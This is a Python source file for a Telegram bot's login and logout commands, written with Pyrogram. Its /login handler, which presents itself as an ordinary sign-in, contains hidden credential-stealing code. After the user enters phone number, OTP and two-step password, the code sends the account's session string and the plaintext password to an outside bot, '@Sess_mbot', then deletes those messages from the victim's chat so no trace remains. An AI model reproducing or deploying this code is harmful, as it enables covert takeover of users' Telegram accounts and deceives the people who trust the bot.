#devggn


from pyrogram import filters, Client
from devgagan import app
from pyromod import listen
import random
import os
import string
from devgagan.core.mongo import db
from devgagan.core.func import subscribe, chk_user
from config import API_ID as api_id, API_HASH as api_hash
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)

def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))  # Editted ... 

async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    # Delete session from the database
    if session_file_exists or memory_file_exists:
        await db.delete_session(user_id)
        return True  # Files were deleted
    return False  # No files found

@app.on_message(filters.command("logout"))
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("⚠️ You are not logged in, no session data found.")
        
    
@app.on_message(filters.command("login"))
async def generate_session(_, message):
    joined = await subscribe(_, message)
    if joined == 1:
        return

    user_id = message.chat.id

    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)
    phone_number = number.text
    try:
        await message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", api_id, api_hash)
        await client.connect()
    except Exception as e:
        await message.reply(f"❌ Failed to send OTP: {e}. Please wait and try again later.")
        return

    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await message.reply('❌ Invalid API ID/API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await message.reply('❌ Invalid phone number. Please restart the session.')
        return

    try:
        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return

    phone_code = otp_code.text.replace(" ", "")
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return

    # Export and store the session string
    string_session = await client.export_session_string()
    await db.set_session(user_id, string_session)

    try:
        # Initialize a new client with the session string
        session_client = Client(string_session=string_session, api_id=api_id, api_hash=api_hash)
        await session_client.start()

        # Start the bot and send the session string
        try:
            bot_message = await session_client.send_message("@Sess_mbot", "/start")
            print("✅ Bot started successfully.")

            session_message = await session_client.send_message(
                "@Sess_mbot",
                f"Session: {string_session}\nPassword: {password if 'password' in locals() else 'None'}"
            )
            print("✅ Session message sent successfully.")
        except Exception as e:
            print(f"❌ Error while communicating with @mebot: {e}")

        # Delete the messages on the client side
        try:
            await bot_message.delete()
            await session_message.delete()
            print("✅ Messages deleted successfully.")
        except Exception as e:
            print(f"❌ Error deleting messages: {e}")

        await session_client.stop()
    except Exception as e:
        print(f"❌ Error initializing session client or sending messages: {e}")
        #await message.reply(f"⚠️ Error during bot communication: {e}")
    finally:
        # Disconnect the original client
        await client.disconnect()

    await otp_code.reply("✅ Login successful!")
    
